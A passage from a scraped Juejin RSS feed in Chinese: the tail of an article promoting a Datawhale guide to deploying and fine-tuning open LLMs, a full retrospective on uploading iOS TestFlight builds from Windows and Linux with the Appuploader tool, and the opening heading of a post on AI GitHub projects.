<p>Linux环境下部署大模型并非易事，各类依赖包、CUDA版本、Python版本冲突频发。《食用指南》提供了详细的模块级配置教程：</p>
<ul>
<li>pip/conda 换源；</li>
<li>huggingface、modelscope等模型下载镜像设置；</li>
<li>git-lfs 安装与使用；</li>
<li>AutoDL/GPU服务器端口开放设置；</li>
<li>Openxlab 开源平台模型快速拉取教程；</li>
</ul>
<p>通过这些配置方案，你可以快速构建出适配当前国内大模型生态的本地运行环境。</p>
<h3 data-id="heading-3">模块二：模型部署 - 覆盖当前热门LLM与MLLM</h3>
<p>教程支持部署接近<strong>80+种主流模型</strong>，包括纯语言模型（LLM）、多模态模型（MLLM）、代码模型、音频模型、视觉处理模型等。</p>
<p>支持部署的主流模型包括但不限于：</p>
<ul>
<li>中文模型：ChatGLM3、InternLM、MiniCPM、Yi、BaiChuan、GLM-4；</li>
<li>国际大咖：LLaMA3、Phi、Gemma、Gemma2、Gemma3、Qwen、OpenELM等；</li>
<li>多模态模型：Kimi-VL、Hunyuan3D、Qwen-VL、MiniCPM-o；</li>
<li>开源“小钢炮”：Qwen1.5、Phi-3-mini、DeepSeek、TransNormerLLM等；</li>
</ul>
<p>不仅支持基础的 Transformers 接口部署，还全套支持：</p>
<ul>
<li>FastAPI 快速接口化；</li>
<li>WebDemo 部署，点击即用的网页界面；</li>
<li>vLLM 轻量推理优化；</li>
<li>Docker 镜像一键上云；</li>
<li>LangChain 集成落地应用。</li>
</ul>
<p>部署完不仅能本地体验，也能快速生成 web 界面互动，大大提高展示及调试效率！</p>
<h3 data-id="heading-4">模块三：模型“调教” - 手把手走进 LoRA 与全参微调世界</h3>
<p>本项目特别强调模型微调，尤其适配普通GPU的<strong>高效微调范式（如LoRA、QLoRA、ptuning等）</strong> 。</p>
<p>你将学到：</p>
<ul>
<li>如何使用 PEFT 工具进行 LoRA 微调；</li>
<li>支持 SwanLab 实验管理平台，实现训练数据可视化；</li>
<li>使用 EvalScope 框架评估 LLM 情商、智商能力；</li>
<li>微调适应 Chat、医学对话、文档问答、数学推理等<strong>特定场景任务</strong>；</li>
<li>如何在单卡显卡（如 RTX4090）完成调教并复用；</li>
</ul>
<p>特别值得一提的是，项目中大量微调任务使用国产模型如 Qwen1.5/Qwen3、InternLM2、MiniCPM 等，并提供微调的完整代码与数据配置案例。</p>
<h3 data-id="heading-5">模块四：项目实战 - 模拟角色玩法+特色模型应用案例</h3>
<p>学会了技术怎么用，还可以进一步实现更有趣的玩法。这套教程推出一批创新项目示例（Example 系列），帮助大家探索 LLM 的边界创造力：</p>
<ol>
<li><strong>Chat-甄嬛</strong>：基于《甄嬛传》台词微调的大模型，实现角色扮演语言风格模拟，LoRA实战示例；</li>
<li><strong>Tianji-天机</strong>：结合智能体构建、人情世故场景、提示词工程等内容，完成AI社交助理；</li>
<li><strong>AMChat</strong>：Advanced Mathematics Chat，构建能够“解微积分题”的数学专家；</li>
<li><strong>数字生命</strong>：输入你自己的语料构建个性化“AI分身”，复刻情绪、口吻甚至文字逻辑风格。</li>
</ol>
<p>每一个都是从环境配置、模型选型，到数据制作、LoRA调教、评估分析的真实流程案例，对标现实中最具想象力的应用创新。</p>
<hr/>
<h2 data-id="heading-6">示例库详解：最强开源模型合集</h2>
<p>项目附带的模型食用清单也十分丰富且系统，涵盖最当前沿的国产与国际模型生态，支持文生文、图文、多模态、智能体、代码生成等人才培养场景。</p>
<p>以下是部分支持的模型类别及代表：</p>



































<table><thead><tr><th>模型类别</th><th>代表模型</th><th>支持操作</th></tr></thead><tbody><tr><td>大语言模型</td><td>ChatGLM3、InternLM3、Qwen3、DeepSeek、Baichuan等</td><td>FastAPI/WebDemo/vLLM/LangChain/LoRA</td></tr><tr><td>多模态模型</td><td>MiniCPM-o、Kimi-VL、Qwen2-VL等</td><td>图文理解、语音合成、LaTeX截图识别等</td></tr><tr><td>代码模型</td><td>Qwen-Coder、DeepSeek-Coder、Phi-Coder等</td><td>代码生成、自动debug、部署扩展等</td></tr><tr><td>数学推理模型</td><td>InternLM2-Math、AMChat 等</td><td>方程求解、导数计算、逻辑证明</td></tr><tr><td>视觉理解模型</td><td>Hunyuan3D-2、SpatialLM</td><td>3D识别、几何分析等</td></tr></tbody></table>
<p>每个模型的部署均克服了国内访问慢、依赖不匹配等实际问题，真正做到了“跟着文档走就能跑”的地步！</p>
<hr/>
<h2 data-id="heading-7">学习路线建议：新手至高手只需三步！</h2>
<blockquote>
<p>“大模型太复杂，不知道从哪里学起。”</p>
</blockquote>
<p>放心，《食用指南》已经贴心地给出了学习Next Step：</p>
<ol>
<li><strong>入门阶段</strong>：</li>
</ol>
<ul>
<li>环境配置练习：熟悉Linux+CUDA+conda等常见依赖；</li>
<li>尝试运行小模型，如 Qwen1.5、MiniCPM、InternLM2；</li>
</ul>
<ol start="2">
<li><strong>提升阶段</strong>：</li>
</ol>
<ul>
<li>完成 LoRA 微调项目，如“Chat-甄嬛”；</li>
<li>尝试 GPTQ 模型部署与内存量化压缩；</li>
</ul>
<ol start="3">
<li><strong>进阶迁移</strong>：</li>
</ol>
<ul>
<li>尝试 WebDemo 部署，或与 LangChain 构建应用；</li>
<li>自定义任务微调，例如医学对话、语义解构等；</li>
<li>整合 SwanLab 评估与训练指标可视化，构建调研报告；</li>
</ul>
<hr/>
<h2 data-id="heading-8">延伸阅读：更进一步的学习资源推荐</h2>
<p>如果你在跟随《食用指南》掌握了部署与调优技术，想深入了解原理、训练方法、应用开发，推荐进一步参阅以下 Datawhale 项目：</p>
<ul>
<li>🎓 Happy-LLM：从零阅读+实现大语言模型，理解Attention机制</li>
</ul>
<h2 data-id="heading-9">学习资源推荐</h2>
<p>如果你想更深入地学习大模型，以下是一些非常有价值的学习资源，这些资源将帮助你从不同角度学习大模型，提升你的实践能力。</p>
<blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">智泊AI</a>。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[iOS 上架 TestFlight 的真实流程复盘 从构建、上传到审核的团队协作方式]]></title>    <link>https://juejin.cn/post/7579785426266767360</link>    <guid>https://juejin.cn/post/7579785426266767360</guid>    <pubDate>2025-12-04T09:50:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579785426266767360" data-draft-id="7579785426266750976" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="iOS 上架 TestFlight 的真实流程复盘 从构建、上传到审核的团队协作方式"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-04T09:50:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="开心就好2025"/> <meta itemprop="url" content="https://juejin.cn/user/3850962908492660"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            iOS 上架 TestFlight 的真实流程复盘 从构建、上传到审核的团队协作方式
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3850962908492660/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    开心就好2025
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T09:50:19.000Z" title="Thu Dec 04 2025 09:50:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在大多数移动项目中，TestFlight（TF）是团队验证质量、收集反馈、预审体验的关键环节。它不像正式发布那样严格，但流程也绝非简单上传 IPA 就能完成。
特别是对于跨平台项目（uni-app、Flutter、Web H5 包装、RN），整个 TF 流程常常会卡在“上传 IPA”与“证书管理”两个环节，因为它们高度依赖 macOS 的工具链（Transporter、Xcode）。</p>
<p>这篇文章记录的是我们团队最近一次 TF 发布的复盘，重点在于：</p>
<ul>
<li>如何让 Windows、Linux 团队也能稳定提 TestFlight</li>
<li>如何避免人员依赖、设备依赖</li>
<li>如何借助多工具组合稳定交付</li>
<li>开心上架（Appuploader）在流程中发挥的实际作用</li>
</ul>
<hr/>
<h2 data-id="heading-0"><strong>一、为什么 TF 是项目交付中最常见的瓶颈？</strong></h2>
<p>从工程角度看，TF 有两个“天然限制”：</p>
<h3 data-id="heading-1"><strong>1. 上传 IPA 依赖 macOS 工具链</strong></h3>
<p>官方手段只有两种：</p>
<ul>
<li>Xcode Organizer</li>
<li>Transporter App</li>
</ul>
<p>都只能在 Mac 上运行。
对于以 Windows + Linux 为主的团队，这等于直接断路。</p>
<hr/>
<h3 data-id="heading-2"><strong>2. TF 审核快速但仍需规范化资源</strong></h3>
<p>上传后需要：</p>
<ul>
<li>后台填写正确的应用信息</li>
<li>提供有效的测试账号</li>
<li>处理隐私标签、权限说明</li>
<li>应对常见的 2.1/4.3/5.1.1 拒审</li>
</ul>
<p>因此 TF 常常不是“上传一次就完事”，而是一个需要多次迭代的过程。</p>
<p>而卡住最多的环节通常都是第一个：<strong>上传 IPA。</strong></p>
<hr/>
<h2 data-id="heading-3"><strong>二、我们重新设计了一条“跨平台的 TF 发布链路”</strong></h2>
<p>为了让 TF 流程不被某台 Mac 绑定，我们把流程拆解为三部分：</p>
<pre><code class="hljs">构建 → 上传 → 审核准备
</code></pre>
<p>并为每部分分别找到了最适合的工具。</p>
<hr/>
<h2 data-id="heading-4"><strong>三、构建阶段：使用云端或 CI 自动打包 IPA</strong></h2>
<p>不同技术栈的项目构建方式不一样，但共性是：</p>
<ul>
<li>构建可以自动化</li>
<li>上传不能依赖某个人或某台设备</li>
</ul>
<p>我们团队常见方案：</p>
<ul>
<li>uni-app → HBuilderX 云打包</li>
<li>Flutter → CI（Linux）跑 <code>flutter build ipa</code></li>
<li>原生项目 → CI（macOS）使用 Xcode build</li>
</ul>
<p>这样构建产物（IPA）始终可控、稳定。</p>
<hr/>
<h2 data-id="heading-5"><strong>四、证书阶段：用开心上架（Appuploader）统一管理证书与 Profile</strong></h2>
<p>传统方式中，证书管理是 TF 阶段最“消耗开发者精力”的部分：</p>
<ul>
<li>必须使用 Mac 钥匙串</li>
<li>CSR → 证书 → p12 → 描述文件流程繁琐</li>
<li>容易出现 profile 冲突</li>
<li>多人协作容易覆盖彼此证书</li>
</ul>
<p>为避免这些问题，我们采用了以下方式：</p>
<h3 data-id="heading-6"><strong>使用 开心上架 的证书管理功能完成证书创建与分发</strong></h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2ea4527af3e54755beb483679332f4ff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5byA5b-D5bCx5aW9MjAyNQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765446619&amp;x-signature=TtmmcynaZxRVioKDHFusbV81q%2Bc%3D" alt="证书管理" loading="lazy"/></p>
<p>包括：</p>
<ul>
<li>创建 iOS 开发证书</li>
<li>创建 iOS 发布证书</li>
<li>创建并下载描述文件</li>
<li>Windows / Linux / Mac 均可使用</li>
<li>多电脑之间共享 p12/provisioning</li>
</ul>
<p>好处是明显的：</p>
<ul>
<li>无需 Mac</li>
<li>证书不再私有化</li>
<li>任何人都能构建 TF 包</li>
<li>CI 也能导入证书</li>
</ul>
<p>证书管理不再是 TF 的“巨坑”。</p>
<hr/>
<h2 data-id="heading-7"><strong>五、上传阶段：TF 发布真正的痛点与突破点</strong></h2>
<h3 data-id="heading-8">### <strong>传统：Transporter 完全依赖 macOS</strong></h3>
<ul>
<li>Windows 不能用</li>
<li>Linux 不能用</li>
<li>CI 无法自动化</li>
<li>Transporter 偶尔卡死</li>
<li>Apple ID 登录经常异常</li>
</ul>
<p>TF 被迫变成“必须找一个有 Mac 的人帮忙上传”。</p>
<hr/>
<h2 data-id="heading-9"><strong>六、用 开心上架（Appuploader）实现跨平台上传 TF 包</strong></h2>
<p>这是整个流程中最关键的部分。</p>
<p>开心上架的命令行上传工具支持：</p>
<ul>
<li>Windows</li>
<li>Linux</li>
<li>macOS</li>
</ul>
<p>无需 Transporter，无需 Xcode，无需 Mac。</p>
<p>上传示例：</p>
<pre><code class="hljs language-css" lang="css">appuploader_cli -u team<span class="hljs-keyword">@icloud</span>.com -p xxx-xxx-xxx-xxx -c <span class="hljs-number">2</span> -f tf_build.ipa
</code></pre>
<p>参数说明：</p>
<ul>
<li><code>-u</code> Apple ID</li>
<li><code>-p</code> 应用专用密码</li>
<li><code>-c</code> 上传通道（1 老通道 / 2 新通道）</li>
<li><code>-f</code> 要上传的 IPA 文件</li>
</ul>
<p><strong>上传到 TF 和上传到正式审核的流程完全一样，工具不需要做任何额外适配。</strong>
图形化界面：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/464cc45b0d29497882e9e4a2f82ee1b9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5byA5b-D5bCx5aW9MjAyNQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765446619&amp;x-signature=wxyHHAyv%2BfqZ57j1hr1MUeAtJdc%3D" alt="ipa上传" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-10"><strong>网页端上传更适合运营 / 测试使用</strong></h3>
<p>网址：
<strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fweb.applicationloader.net%2F" target="_blank" title="https://web.applicationloader.net/" ref="nofollow noopener noreferrer">web.applicationloader.net/</a></strong></p>
<p>浏览器直接上传即可：</p>
<ul>
<li>无需安装软件</li>
<li>无需环境变量</li>
<li>无需有 Mac</li>
</ul>
<p>我们团队经常由测试人员直接从网页上传 TF 包。</p>
<hr/>
<h2 data-id="heading-11"><strong>七、App Store Connect 资料准备：开心上架提升 TF 信息录入效率</strong></h2>
<p>虽然 TF 审核相对宽松，但仍需准备：</p>
<ul>
<li>测试账号</li>
<li>测试说明</li>
<li>权限用途</li>
<li>隐私说明</li>
</ul>
<p>截图也可提前上传，尤其是：</p>
<ul>
<li>iPhone 全尺寸</li>
<li>iPad 尺寸</li>
<li>多语言版本（如有）</li>
</ul>
<p>开心上架支持批量上传截图、描述、关键词等文本字段，让每次 TF 重新提交时不再反复点选。
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1d73ee02b5034e5ba268b67c036d809b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5byA5b-D5bCx5aW9MjAyNQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765446619&amp;x-signature=iK8nDe6A9J46aXMwguaHg1GhUjs%3D" alt="asc" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-12"><strong>八、TF 审核经验：跨平台项目最容易踩的坑</strong></h2>
<p>在 TF 审核中，最容易遇到的问题是：</p>
<ul>
<li>测试账号无法登录 → 2.1</li>
<li>权限描述含糊不清 → 5.1.1</li>
<li>应用结构与描述不一致 → 4.3</li>
<li>内测说明写得不清楚</li>
</ul>
<p>建议：</p>
<ol>
<li>说明如何进入主要功能</li>
<li>提供稳定的测试账号</li>
<li>对权限使用明确说明</li>
<li>如果是 WebView，测试路径写清楚</li>
<li>App 内尽量避免空白页面</li>
</ol>
<p>TF 虽然快，但也不会随便放行。</p>
<hr/>
<h2 data-id="heading-13"><strong>最终，我们构建了一条“真正跨平台的 TF 发布流水线”</strong></h2>
<p>流程如下：</p>
<pre><code class="hljs language-swift" lang="swift">构建（云<span class="hljs-operator">/</span><span class="hljs-type">CI）</span>
<span class="hljs-operator">→</span> 证书管理（开心上架）
<span class="hljs-operator">→</span> 上传 <span class="hljs-type">IPA（开心上架命令行</span> <span class="hljs-operator">/</span> 网页端）
<span class="hljs-operator">→</span> 填写 <span class="hljs-type">TF</span> 信息
<span class="hljs-operator">→</span> 审核反馈处理
</code></pre>
<p>整个流程具备：</p>
<ul>
<li>不依赖 Mac</li>
<li>Windows 可上传</li>
<li>Linux 可上传</li>
<li>测试与运营可直接参与</li>
<li>审核资料规范可复用</li>
<li>工程链路完整稳定</li>
</ul>
<p>对跨端团队来说，这是最现实可落地的 TF 发布方式。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[发现 3 个牛哄哄 AI 的 GitHub 开源项目，速速收藏。]]></title>    <link>https://juejin.cn/post/7579814711853252618</link>    <guid>https://juejin.cn/post/7579814711853252618</guid>    <pubDate>2025-12-04T09:50:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579814711853252618" data-draft-id="7579832186879606834" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="发现 3 个牛哄哄 AI 的 GitHub 开源项目，速速收藏。"/> <meta itemprop="keywords" content="GitHub"/> <meta itemprop="datePublished" content="2025-12-04T09:50:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="逛逛GitHub"/> <meta itemprop="url" content="https://juejin.cn/user/1442202996186093"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            发现 3 个牛哄哄 AI 的 GitHub 开源项目，速速收藏。
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1442202996186093/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    逛逛GitHub
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T09:50:03.000Z" title="Thu Dec 04 2025 09:50:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">01、小红书采集神器</h2>
